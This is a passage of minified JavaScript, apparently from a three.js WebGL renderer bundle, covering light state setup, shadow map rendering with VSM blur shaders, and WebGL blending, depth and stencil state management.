H,direction:new H,color:new je,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":n={position:new H,color:new je,distance:0,decay:0};break;case"HemisphereLight":n={direction:new H,skyColor:new je,groundColor:new je};break;case"RectAreaLight":n={color:new je,position:new H,halfWidth:new H,halfHeight:new H};break}return t[e.id]=n,n}}}function CA(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ze};break;case"SpotLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ze};break;case"PointLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ze,shadowCameraNear:1,shadowCameraFar:1e3};break}return t[e.id]=n,n}}}let RA=0;function PA(t,e){return(e.castShadow?2:0)-(t.castShadow?2:0)+(e.map?1:0)-(t.map?1:0)}function kA(t){const e=new AA,n=CA(),i={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let c=0;c<9;c++)i.probe.push(new H);const s=new H,r=new bt,a=new bt;function o(c){let p=0,d=0,h=0;for(let w=0;w<9;w++)i.probe[w].set(0,0,0);let f=0,v=0,y=0,m=0,u=0,g=0,_=0,b=0,T=0,A=0,C=0;c.sort(PA);for(let w=0,E=c.length;w<E;w++){const P=c[w],G=P.color,V=P.intensity,Z=P.distance;let O=null;if(P.shadow&&P.shadow.map&&(P.shadow.map.texture.format===Ir?O=P.shadow.map.texture:O=P.shadow.map.depthTexture||P.shadow.map.texture),P.isAmbientLight)p+=G.r*V,d+=G.g*V,h+=G.b*V;else if(P.isLightProbe){for(let z=0;z<9;z++)i.probe[z].addScaledVector(P.sh.coefficients[z],V);C++}else if(P.isDirectionalLight){const z=e.get(P);if(z.color.copy(P.color).multiplyScalar(P.intensity),P.castShadow){const F=P.shadow,I=n.get(P);I.shadowIntensity=F.intensity,I.shadowBias=F.bias,I.shadowNormalBias=F.normalBias,I.shadowRadius=F.radius,I.shadowMapSize=F.mapSize,i.directionalShadow[f]=I,i.directionalShadowMap[f]=O,i.directionalShadowMatrix[f]=P.shadow.matrix,g++}i.directional[f]=z,f++}else if(P.isSpotLight){const z=e.get(P);z.position.setFromMatrixPosition(P.matrixWorld),z.color.copy(G).multiplyScalar(V),z.distance=Z,z.coneCos=Math.cos(P.angle),z.penumbraCos=Math.cos(P.angle*(1-P.penumbra)),z.decay=P.decay,i.spot[y]=z;const F=P.shadow;if(P.map&&(i.spotLightMap[T]=P.map,T++,F.updateMatrices(P),P.castShadow&&A++),i.spotLightMatrix[y]=F.matrix,P.castShadow){const I=n.get(P);I.shadowIntensity=F.intensity,I.shadowBias=F.bias,I.shadowNormalBias=F.normalBias,I.shadowRadius=F.radius,I.shadowMapSize=F.mapSize,i.spotShadow[y]=I,i.spotShadowMap[y]=O,b++}y++}else if(P.isRectAreaLight){const z=e.get(P);z.color.copy(G).multiplyScalar(V),z.halfWidth.set(P.width*.5,0,0),z.halfHeight.set(0,P.height*.5,0),i.rectArea[m]=z,m++}else if(P.isPointLight){const z=e.get(P);if(z.color.copy(P.color).multiplyScalar(P.intensity),z.distance=P.distance,z.decay=P.decay,P.castShadow){const F=P.shadow,I=n.get(P);I.shadowIntensity=F.intensity,I.shadowBias=F.bias,I.shadowNormalBias=F.normalBias,I.shadowRadius=F.radius,I.shadowMapSize=F.mapSize,I.shadowCameraNear=F.camera.near,I.shadowCameraFar=F.camera.far,i.pointShadow[v]=I,i.pointShadowMap[v]=O,i.pointShadowMatrix[v]=P.shadow.matrix,_++}i.point[v]=z,v++}else if(P.isHemisphereLight){const z=e.get(P);z.skyColor.copy(P.color).multiplyScalar(V),z.groundColor.copy(P.groundColor).multiplyScalar(V),i.hemi[u]=z,u++}}m>0&&(t.has("OES_texture_float_linear")===!0?(i.rectAreaLTC1=pe.LTC_FLOAT_1,i.rectAreaLTC2=pe.LTC_FLOAT_2):(i.rectAreaLTC1=pe.LTC_HALF_1,i.rectAreaLTC2=pe.LTC_HALF_2)),i.ambient[0]=p,i.ambient[1]=d,i.ambient[2]=h;const L=i.hash;(L.directionalLength!==f||L.pointLength!==v||L.spotLength!==y||L.rectAreaLength!==m||L.hemiLength!==u||L.numDirectionalShadows!==g||L.numPointShadows!==_||L.numSpotShadows!==b||L.numSpotMaps!==T||L.numLightProbes!==C)&&(i.directional.length=f,i.spot.length=y,i.rectArea.length=m,i.point.length=v,i.hemi.length=u,i.directionalShadow.length=g,i.directionalShadowMap.length=g,i.pointShadow.length=_,i.pointShadowMap.length=_,i.spotShadow.length=b,i.spotShadowMap.length=b,i.directionalShadowMatrix.length=g,i.pointShadowMatrix.length=_,i.spotLightMatrix.length=b+T-A,i.spotLightMap.length=T,i.numSpotLightShadowsWithMaps=A,i.numLightProbes=C,L.directionalLength=f,L.pointLength=v,L.spotLength=y,L.rectAreaLength=m,L.hemiLength=u,L.numDirectionalShadows=g,L.numPointShadows=_,L.numSpotShadows=b,L.numSpotMaps=T,L.numLightProbes=C,i.version=RA++)}function l(c,p){let d=0,h=0,f=0,v=0,y=0;const m=p.matrixWorldInverse;for(let u=0,g=c.length;u<g;u++){const _=c[u];if(_.isDirectionalLight){const b=i.directional[d];b.direction.setFromMatrixPosition(_.matrixWorld),s.setFromMatrixPosition(_.target.matrixWorld),b.direction.sub(s),b.direction.transformDirection(m),d++}else if(_.isSpotLight){const b=i.spot[f];b.position.setFromMatrixPosition(_.matrixWorld),b.position.applyMatrix4(m),b.direction.setFromMatrixPosition(_.matrixWorld),s.setFromMatrixPosition(_.target.matrixWorld),b.direction.sub(s),b.direction.transformDirection(m),f++}else if(_.isRectAreaLight){const b=i.rectArea[v];b.position.setFromMatrixPosition(_.matrixWorld),b.position.applyMatrix4(m),a.identity(),r.copy(_.matrixWorld),r.premultiply(m),a.extractRotation(r),b.halfWidth.set(_.width*.5,0,0),b.halfHeight.set(0,_.height*.5,0),b.halfWidth.applyMatrix4(a),b.halfHeight.applyMatrix4(a),v++}else if(_.isPointLight){const b=i.point[h];b.position.setFromMatrixPosition(_.matrixWorld),b.position.applyMatrix4(m),h++}else if(_.isHemisphereLight){const b=i.hemi[y];b.direction.setFromMatrixPosition(_.matrixWorld),b.direction.transformDirection(m),y++}}}return{setup:o,setupView:l,state:i}}function Vm(t){const e=new kA(t),n=[],i=[];function s(p){c.camera=p,n.length=0,i.length=0}function r(p){n.push(p)}function a(p){i.push(p)}function o(){e.setup(n)}function l(p){e.setupView(n,p)}const c={lightsArray:n,shadowsArray:i,camera:null,lights:e,transmissionRenderTarget:{}};return{init:s,state:c,setupLights:o,setupLightsView:l,pushLight:r,pushShadow:a}}function LA(t){let e=new WeakMap;function n(s,r=0){const a=e.get(s);let o;return a===void 0?(o=new Vm(t),e.set(s,[o])):r>=a.length?(o=new Vm(t),a.push(o)):o=a[r],o}function i(){e=new WeakMap}return{get:n,dispose:i}}const NA=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,IA=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ).rg;
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ).r;
			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( max( 0.0, squared_mean - mean * mean ) );
	gl_FragColor = vec4( mean, std_dev, 0.0, 1.0 );
}`,DA=[new H(1,0,0),new H(-1,0,0),new H(0,1,0),new H(0,-1,0),new H(0,0,1),new H(0,0,-1)],UA=[new H(0,-1,0),new H(0,-1,0),new H(0,0,1),new H(0,0,-1),new H(0,-1,0),new H(0,-1,0)],Hm=new bt,sa=new H,pu=new H;function OA(t,e,n){let i=new dh;const s=new Ze,r=new Ze,a=new St,o=new qw,l=new Yw,c={},p=n.maxTextureSize,d={[ls]:hn,[hn]:ls,[yi]:yi},h=new di({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new Ze},radius:{value:4}},vertexShader:NA,fragmentShader:IA}),f=h.clone();f.defines.HORIZONTAL_PASS=1;const v=new $n;v.setAttribute("position",new li(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const y=new Nn(v,h),m=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=nl;let u=this.type;this.render=function(A,C,L){if(m.enabled===!1||m.autoUpdate===!1&&m.needsUpdate===!1||A.length===0)return;A.type===Db&&(Ie("WebGLShadowMap: PCFSoftShadowMap has been deprecated. Using PCFShadowMap instead."),A.type=nl);const w=t.getRenderTarget(),E=t.getActiveCubeFace(),P=t.getActiveMipmapLevel(),G=t.state;G.setBlending(Mi),G.buffers.depth.getReversed()===!0?G.buffers.color.setClear(0,0,0,0):G.buffers.color.setClear(1,1,1,1),G.buffers.depth.setTest(!0),G.setScissorTest(!1);const V=u!==this.type;V&&C.traverse(function(Z){Z.material&&(Array.isArray(Z.material)?Z.material.forEach(O=>O.needsUpdate=!0):Z.material.needsUpdate=!0)});for(let Z=0,O=A.length;Z<O;Z++){const z=A[Z],F=z.shadow;if(F===void 0){Ie("WebGLShadowMap:",z,"has no shadow.");continue}if(F.autoUpdate===!1&&F.needsUpdate===!1)continue;s.copy(F.mapSize);const I=F.getFrameExtents();if(s.multiply(I),r.copy(F.mapSize),(s.x>p||s.y>p)&&(s.x>p&&(r.x=Math.floor(p/I.x),s.x=r.x*I.x,F.mapSize.x=r.x),s.y>p&&(r.y=Math.floor(p/I.y),s.y=r.y*I.y,F.mapSize.y=r.y)),F.map===null||V===!0){if(F.map!==null&&(F.map.depthTexture!==null&&(F.map.depthTexture.dispose(),F.map.depthTexture=null),F.map.dispose()),this.type===ca){if(z.isPointLight){Ie("WebGLShadowMap: VSM shadow maps are not supported for PointLights. Use PCF or BasicShadowMap instead.");continue}F.map=new oi(s.x,s.y,{format:Ir,type:ki,minFilter:qt,magFilter:qt,generateMipmaps:!1}),F.map.texture.name=z.name+".shadowMap",F.map.depthTexture=new ja(s.x,s.y,ni),F.map.depthTexture.name=z.name+".shadowMapDepth",F.map.depthTexture.format=Li,F.map.depthTexture.compareFunction=null,F.map.depthTexture.minFilter=Bt,F.map.depthTexture.magFilter=Bt}else{z.isPointLight?(F.map=new Y0(s.x),F.map.depthTexture=new Ww(s.x,ci)):(F.map=new oi(s.x,s.y),F.map.depthTexture=new ja(s.x,s.y,ci)),F.map.depthTexture.name=z.name+".shadowMap",F.map.depthTexture.format=Li;const K=t.state.buffers.depth.getReversed();this.type===nl?(F.map.depthTexture.compareFunction=K?oh:ah,F.map.depthTexture.minFilter=qt,F.map.depthTexture.magFilter=qt):(F.map.depthTexture.compareFunction=null,F.map.depthTexture.minFilter=Bt,F.map.depthTexture.magFilter=Bt)}F.camera.updateProjectionMatrix()}const X=F.map.isWebGLCubeRenderTarget?6:1;for(let K=0;K<X;K++){if(F.map.isWebGLCubeRenderTarget)t.setRenderTarget(F.map,K),t.clear();else{K===0&&(t.setRenderTarget(F.map),t.clear());const ne=F.getViewport(K);a.set(r.x*ne.x,r.y*ne.y,r.x*ne.z,r.y*ne.w),G.viewport(a)}if(z.isPointLight){const ne=F.camera,ye=F.matrix,Le=z.distance||ne.far;Le!==ne.far&&(ne.far=Le,ne.updateProjectionMatrix()),sa.setFromMatrixPosition(z.matrixWorld),ne.position.copy(sa),pu.copy(ne.position),pu.add(DA[K]),ne.up.copy(UA[K]),ne.lookAt(pu),ne.updateMatrixWorld(),ye.makeTranslation(-sa.x,-sa.y,-sa.z),Hm.multiplyMatrices(ne.projectionMatrix,ne.matrixWorldInverse),F._frustum.setFromProjectionMatrix(Hm,ne.coordinateSystem,ne.reversedDepth)}else F.updateMatrices(z);i=F.getFrustum(),b(C,L,F.camera,z,this.type)}F.isPointLightShadow!==!0&&this.type===ca&&g(F,L),F.needsUpdate=!1}u=this.type,m.needsUpdate=!1,t.setRenderTarget(w,E,P)};function g(A,C){const L=e.update(y);h.defines.VSM_SAMPLES!==A.blurSamples&&(h.defines.VSM_SAMPLES=A.blurSamples,f.defines.VSM_SAMPLES=A.blurSamples,h.needsUpdate=!0,f.needsUpdate=!0),A.mapPass===null&&(A.mapPass=new oi(s.x,s.y,{format:Ir,type:ki})),h.uniforms.shadow_pass.value=A.map.depthTexture,h.uniforms.resolution.value=A.mapSize,h.uniforms.radius.value=A.radius,t.setRenderTarget(A.mapPass),t.clear(),t.renderBufferDirect(C,null,L,h,y,null),f.uniforms.shadow_pass.value=A.mapPass.texture,f.uniforms.resolution.value=A.mapSize,f.uniforms.radius.value=A.radius,t.setRenderTarget(A.map),t.clear(),t.renderBufferDirect(C,null,L,f,y,null)}function _(A,C,L,w){let E=null;const P=L.isPointLight===!0?A.customDistanceMaterial:A.customDepthMaterial;if(P!==void 0)E=P;else if(E=L.isPointLight===!0?l:o,t.localClippingEnabled&&C.clipShadows===!0&&Array.isArray(C.clippingPlanes)&&C.clippingPlanes.length!==0||C.displacementMap&&C.displacementScale!==0||C.alphaMap&&C.alphaTest>0||C.map&&C.alphaTest>0||C.alphaToCoverage===!0){const G=E.uuid,V=C.uuid;let Z=c[G];Z===void 0&&(Z={},c[G]=Z);let O=Z[V];O===void 0&&(O=E.clone(),Z[V]=O,C.addEventListener("dispose",T)),E=O}if(E.visible=C.visible,E.wireframe=C.wireframe,w===ca?E.side=C.shadowSide!==null?C.shadowSide:C.side:E.side=C.shadowSide!==null?C.shadowSide:d[C.side],E.alphaMap=C.alphaMap,E.alphaTest=C.alphaToCoverage===!0?.5:C.alphaTest,E.map=C.map,E.clipShadows=C.clipShadows,E.clippingPlanes=C.clippingPlanes,E.clipIntersection=C.clipIntersection,E.displacementMap=C.displacementMap,E.displacementScale=C.displacementScale,E.displacementBias=C.displacementBias,E.wireframeLinewidth=C.wireframeLinewidth,E.linewidth=C.linewidth,L.isPointLight===!0&&E.isMeshDistanceMaterial===!0){const G=t.properties.get(E);G.light=L}return E}function b(A,C,L,w,E){if(A.visible===!1)return;if(A.layers.test(C.layers)&&(A.isMesh||A.isLine||A.isPoints)&&(A.castShadow||A.receiveShadow&&E===ca)&&(!A.frustumCulled||i.intersectsObject(A))){A.modelViewMatrix.multiplyMatrices(L.matrixWorldInverse,A.matrixWorld);const V=e.update(A),Z=A.material;if(Array.isArray(Z)){const O=V.groups;for(let z=0,F=O.length;z<F;z++){const I=O[z],X=Z[I.materialIndex];if(X&&X.visible){const K=_(A,X,w,E);A.onBeforeShadow(t,A,C,L,V,K,I),t.renderBufferDirect(L,null,V,K,A,I),A.onAfterShadow(t,A,C,L,V,K,I)}}}else if(Z.visible){const O=_(A,Z,w,E);A.onBeforeShadow(t,A,C,L,V,O,null),t.renderBufferDirect(L,null,V,O,A,null),A.onAfterShadow(t,A,C,L,V,O,null)}}const G=A.children;for(let V=0,Z=G.length;V<Z;V++)b(G[V],C,L,w,E)}function T(A){A.target.removeEventListener("dispose",T);for(const L in c){const w=c[L],E=A.target.uuid;E in w&&(w[E].dispose(),delete w[E])}}}const FA={[dd]:pd,[hd]:gd,[fd]:vd,[Lr]:md,[pd]:dd,[gd]:hd,[vd]:fd,[md]:Lr};function BA(t,e){function n(){let N=!1;const fe=new St;let ae=null;const me=new St(0,0,0,0);return{setMask:function(ie){ae!==ie&&!N&&(t.colorMask(ie,ie,ie,ie),ae=ie)},setLocked:function(ie){N=ie},setClear:function(ie,J,oe,Ne,ct){ct===!0&&(ie*=Ne,J*=Ne,oe*=Ne),fe.set(ie,J,oe,Ne),me.equals(fe)===!1&&(t.clearColor(ie,J,oe,Ne),me.copy(fe))},reset:function(){N=!1,ae=null,me.set(-1,0,0,0)}}}function i(){let N=!1,fe=!1,ae=null,me=null,ie=null;return{setReversed:function(J){if(fe!==J){const oe=e.get("EXT_clip_control");J?oe.clipControlEXT(oe.LOWER_LEFT_EXT,oe.ZERO_TO_ONE_EXT):oe.clipControlEXT(oe.LOWER_LEFT_EXT,oe.NEGATIVE_ONE_TO_ONE_EXT),fe=J;const Ne=ie;ie=null,this.setClear(Ne)}},getReversed:function(){return fe},setTest:function(J){J?te(t.DEPTH_TEST):_e(t.DEPTH_TEST)},setMask:function(J){ae!==J&&!N&&(t.depthMask(J),ae=J)},setFunc:function(J){if(fe&&(J=FA[J]),me!==J){switch(J){case dd:t.depthFunc(t.NEVER);break;case pd:t.depthFunc(t.ALWAYS);break;case hd:t.depthFunc(t.LESS);break;case Lr:t.depthFunc(t.LEQUAL);break;case fd:t.depthFunc(t.EQUAL);break;case md:t.depthFunc(t.GEQUAL);break;case gd:t.depthFunc(t.GREATER);break;case vd:t.depthFunc(t.NOTEQUAL);break;default:t.depthFunc(t.LEQUAL)}me=J}},setLocked:function(J){N=J},setClear:function(J){ie!==J&&(fe&&(J=1-J),t.clearDepth(J),ie=J)},reset:function(){N=!1,ae=null,me=null,ie=null,fe=!1}}}function s(){let N=!1,fe=null,ae=null,me=null,ie=null,J=null,oe=null,Ne=null,ct=null;return{setTest:function(tt){N||(tt?te(t.STENCIL_TEST):_e(t.STENCIL_TEST))},setMask:function(tt){fe!==tt&&!N&&(t.stencilMask(tt),fe=tt)},setFunc:function(tt,Kn,pi){(ae!==tt||me!==Kn||ie!==pi)&&(t.stencilFunc(tt,Kn,pi),ae=tt,me=Kn,ie=pi)},setOp:function(tt,Kn,pi){(J!==tt||oe!==Kn||Ne!==pi)&&(t.stencilOp(tt,Kn,pi),J=tt,oe=Kn,Ne=pi)},setLocked:function(tt){N=tt},setClear:function(tt){ct!==tt&&(t.clearStencil(tt),ct=tt)},reset:function(){N=!1,fe=null,ae=null,me=null,ie=null,J=null,oe=null,Ne=null,ct=null}}}const r=new n,a=new i,o=new s,l=new WeakMap,c=new WeakMap;let p={},d={},h=new WeakMap,f=[],v=null,y=!1,m=null,u=null,g=null,_=null,b=null,T=null,A=null,C=new je(0,0,0),L=0,w=!1,E=null,P=null,G=null,V=null,Z=null;const O=t.getParameter(t.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let z=!1,F=0;const I=t.getParameter(t.VERSION);I.indexOf("WebGL")!==-1?(F=parseFloat(/^WebGL (\d)/.exec(I)[1]),z=F>=1):I.indexOf("OpenGL ES")!==-1&&(F=parseFloat(/^OpenGL ES (\d)/.exec(I)[1]),z=F>=2);let X=null,K={};const ne=t.getParameter(t.SCISSOR_BOX),ye=t.getParameter(t.VIEWPORT),Le=new St().fromArray(ne),Ke=new St().fromArray(ye);function Qe(N,fe,ae,me){const ie=new Uint8Array(4),J=t.createTexture();t.bindTexture(N,J),t.texParameteri(N,t.TEXTURE_MIN_FILTER,t.NEAREST),t.texParameteri(N,t.TEXTURE_MAG_FILTER,t.NEAREST);for(let oe=0;oe<ae;oe++)N===t.TEXTURE_3D||N===t.TEXTURE_2D_ARRAY?t.texImage3D(fe,0,t.RGBA,1,1,me,0,t.RGBA,t.UNSIGNED_BYTE,ie):t.texImage2D(fe+oe,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,ie);return J}const Y={};Y[t.TEXTURE_2D]=Qe(t.TEXTURE_2D,t.TEXTURE_2D,1),Y[t.TEXTURE_CUBE_MAP]=Qe(t.TEXTURE_CUBE_MAP,t.TEXTURE_CUBE_MAP_POSITIVE_X,6),Y[t.TEXTURE_2D_ARRAY]=Qe(t.TEXTURE_2D_ARRAY,t.TEXTURE_2D_ARRAY,1,1),Y[t.TEXTURE_3D]=Qe(t.TEXTURE_3D,t.TEXTURE_3D,1,1),r.setClear(0,0,0,1),a.setClear(1),o.setClear(0),te(t.DEPTH_TEST),a.setFunc(Lr),Fe(!1),Et(Xf),te(t.CULL_FACE),et(Mi);function te(N){p[N]!==!0&&(t.enable(N),p[N]=!0)}function _e(N){p[N]!==!1&&(t.disable(N),p[N]=!1)}function De(N,fe){return d[N]!==fe?(t.bindFramebuffer(N,fe),d[N]=fe,N===t.DRAW_FRAMEBUFFER&&(d[t.FRAMEBUFFER]=fe),N===t.FRAMEBUFFER&&(d[t.DRAW_FRAMEBUFFER]=fe),!0):!1}function be(N,fe){let ae=f,me=!1;if(N){ae=h.get(fe),ae===void 0&&(ae=[],h.set(fe,ae));const ie=N.textures;if(ae.length!==ie.length||ae[0]!==t.COLOR_ATTACHMENT0){for(let J=0,oe=ie.length;J<oe;J++)ae[J]=t.COLOR_ATTACHMENT0+J;ae.length=ie.length,me=!0}}else ae[0]!==t.BACK&&(ae[0]=t.BACK,me=!0);me&&t.drawBuffers(ae)}function qe(N){return v!==N?(t.useProgram(N),v=N,!0):!1}const Nt={[Es]:t.FUNC_ADD,[Ob]:t.FUNC_SUBTRACT,[Fb]:t.FUNC_REVERSE_SUBTRACT};Nt[Bb]=t.MIN,Nt[zb]=t.MAX;const Ge={[Vb]:t.ZERO,[Hb]:t.ONE,[Gb]:t.SRC_COLOR,[cd]:t.SRC_ALPHA,[$b]:t.SRC_ALPHA_SATURATE,[qb]:t.DST_COLOR,[jb]:t.DST_ALPHA,[Wb]:t.ONE_MINUS_SRC_COLOR,[ud]:t.ONE_MINUS_SRC_ALPHA,[Yb]:t.ONE_MINUS_DST_COLOR,[Xb]:t.ONE_MINUS_DST_ALPHA,[Kb]:t.CONSTANT_COLOR,[Zb]:t.ONE_MINUS_CONSTANT_COLOR,[Jb]:t.CONSTANT_ALPHA,[Qb]:t.ONE_MINUS_CONSTANT_ALPHA};function et(N,fe,ae,me,ie,J,oe,Ne,ct,tt){if(N===Mi){y===!0&&(_e(t.BLEND),y=!1);return}if(y===!1&&(te(t.BLEND),y=!0),N!==Ub){if(N!==m||tt!==w){if((u!==Es||b!==Es)&&(t.blendEquation(t.FUNC_ADD),u=Es,b=Es),tt)switch(N){case wr:t.blendFuncSeparate(t.ONE,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case qf:t.blendFunc(t.ONE,t.ONE);break;case Yf:t.blendFuncSeparate(t.ZERO,t.ONE_MINUS_SRC_COLOR,t.ZERO,t.ONE);break;case $f:t.blendFuncSeparate(t.DST_COLOR,t.ONE_MINUS_SRC_ALPHA,t.ZERO,t.ONE);break;default:$e("WebGLState: Invalid blending: ",N);break}else switch(N){case wr:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case qf:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE,t.ONE,t.ONE);break;case Yf:$e("WebGLState: SubtractiveBlending requires material.premultipliedAlpha = true");break;case $f:$e("WebGLState: MultiplyBlending requires material.premultipliedAlpha = true");break;default:$e("WebGLState: Invalid blending: ",N);break}g=null,_=null,T=null,A=null,C.set(0,0,0),L=0,m=N,w=tt}return}ie=ie||fe,J=J||ae,oe=oe||me,(fe!==u||ie!==b)&&(t.blendEquationSeparate(Nt[fe],Nt[ie]),u=fe,b=ie),(ae!==g||me!==_||J!==T||oe!==A)&&(t.blendFuncSeparate(Ge[ae],Ge[me],Ge[J],Ge[oe]),g=ae,_=me,T=J,A=oe),(Ne.equals(C)===!1||ct!==L)&&(t.blendColor(Ne.r,Ne.g,Ne.b,ct),C.copy(Ne),L=ct),m=N,w=!1}function at(N,fe){N.side===yi?_e(t.CULL_FACE):te(t.CULL_FACE);let ae=N.side===hn;fe&&(ae=!ae),Fe(ae),N.blending===wr&&N.transparent===!1?et(Mi):et(N.blending,N.blendEquation,N.blendSrc,N.blendDst,N.blendEquationAlpha,N.blendSrcAlpha,N.blendDstAlpha,N.blendColor,N.blendAlpha,N.premultipliedAlpha),a.setFunc(N.depthFunc),a.setTest(N.depthTest),a.setMask(N.depthWrite),r.setMask(N.colorWrite);const me=N.stencilWrite;o.setTest(me),me&&(o.setMask(N.stencilWriteMask),o.setFunc(N.stencilFunc,N.stencilRef,N.stencilFuncMask),o.setOp(N.stencilFail,N.stencilZFail,N.stencilZPass)),Mt(N.polygonOffset,N.polygonOffsetFactor,N.polygonOffsetUnits),N.alphaToCoverage===!0?te(t.SAMPLE_ALPHA_TO_COVERAGE):_e(t.SAMPLE_ALPHA_TO_COVERAGE)}function Fe(N){E!==N&&(N?t.frontFace(t.CW):t.frontFace(t.CCW),E=N)}function Et(N){N!==Nb?(te(t.CULL_FACE),N!==P&&(N===Xf?t.cullFace(t.BACK):N===Ib?t.cullFace(t.FRONT):t.cullFace(t.FRONT_AND_BACK))):_e(t.CULL_FACE),P=N}function k(N){N!==G&&(z&&t.lineWidth(N),G=N)}function Mt(N,fe,ae){N?(te(t.POLYGON_OFFSET_FILL),(V!==fe||Z!==ae)&&(t.polygonOffset(fe,ae),V=fe,Z=ae)):_e(t.POLYGON_OFFSET_FILL)}function Je(N){N?te(t.SCISSOR_TEST):_e(t.SCISSOR_TEST)}function lt(N){N===void 0&&(N=t.TEXTURE0+O-1),X!==N&&(t.activeTexture(N),X=N)}function Ee(N,fe,ae){ae===void 0&&(X===null?ae=t.TEXTURE0+O-1:ae=X);let me=K[ae];me===void 0&&(me={type:void 0,texture:void 0},K[ae]=me),(me.type!==N||me.texture!==fe)&&(X!==ae&&(t.activeTexture(ae),X=ae),t.bindTexture(N,fe||Y[N]),me.type=N,me.texture=fe)}function R(){const N=K[X];N!==void 0&&N.type!==void 0&&(t.bindTexture(N.type,null),N.type=void 0,N.texture=void 0)}function x(){try{t.compressedTexImage2D(...arguments)}catch(N){$e("WebGLState:",N)}}function D(){try{t.compressedTexImage3D(...arguments)}catch(N){$e("WebGLState:",N)}}function $(){try{t.texSubImage2D(...arguments)}catch(N){$e("WebGLState:",N)}}function ee(){try{t.texSubImage3D(...arguments)}catch(N){$e("WebGLState:",N)}}function q(){try{t.compressedTexSubImage2D(...arguments)}catch(N){$e("WebGLState:",N)}}function Te(){try{t.compressedTexSubImage3D(...arguments)}catch(N){$e("WebGLState:",N)}}function le(){try{t.texStorage2D(...arguments)}catch(N){$e("WebGLState:",N)}}function we(){try{t.texStorage3D(...arguments)}catch(N){$e("WebGLState:",N)}}function ke(){try{t.texImage2D(...arguments)}catch(N){$e("WebGLState:",N)}}function re(){try{t.texImage3D(...arguments)}catch(N){$e("WebGLState:",N)}}function ue(N){Le.equals(N)===!1&&(t.scissor(N.x,N.y,N.z,N.w),Le.copy(N))}function Se(N){Ke.equals(N)===!1&&(t.viewport(N.x,N.y,N.z,N.w),Ke.copy(N))}function Me(N,fe){let ae=c.get(fe);ae===void 0&&(ae=new WeakMap,c.set(fe,ae));let me=ae.get(N);me===void 0&&(me=t.getUniformBlockIndex(fe,N.name),ae.set(N,me))}function ce(N,fe){const me=c.get(fe).get(N);l.get(fe)!==me&&(t.uniformBlockBinding(fe,me,N.__bindingPointIndex),l.set(fe,me))}function Be(){t.disable(t.BLEND),t.disable(t.CULL_FACE),t.disable(t.DEPTH_TEST),t.disable(t.POLYGON_OFFSET_FILL),t.disable(t.SCISSOR_TEST),t.disable(t.STENCIL_TEST),t.disable(t.SAMPLE_ALPHA_TO_COVERAGE),t.blendEquation(t.FUNC_ADD),t.blendFunc(t.ONE,t.ZERO),t.blendFuncSeparate(t.ONE,t.ZERO,t.ONE,t.ZERO),t.blendColor(0,0,0,0),t.colorMask(!0,!0,!0,!0),t.clearColor(0,0,0,0),t.depthMask(!0),t.depthFunc(t.LESS),a.setReversed(!1),t.clearDepth(1),t.stencilMask(4294967295),t.stencilFunc(t.ALWAYS,0,4294967295),t.stencilOp(t.KEEP,t.KEEP,t.KEEP),t.clearStencil(0),t.cullFace(t.BACK),t.frontFace(t.CCW),t.polygonOffset(0,0),t.activeTexture(t.TEXTURE0),t.bindFramebuffer(t.FRAMEBUFFER,null),t.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),t.bindFramebuffer(t.READ_FRAMEBUFFER,null),t.useProgram(null),t.lineWidth(1),t.scissor(0,0,t.canvas.width,t.canvas.height),t.viewport(0,0,t.canvas.width,t.canvas.height),p={},X=null,K={},d={},h=new WeakMap,f=[],v=null,y=!1,m=null,u=null,g=null,_=null,b=null,T=null,A=null,C=new 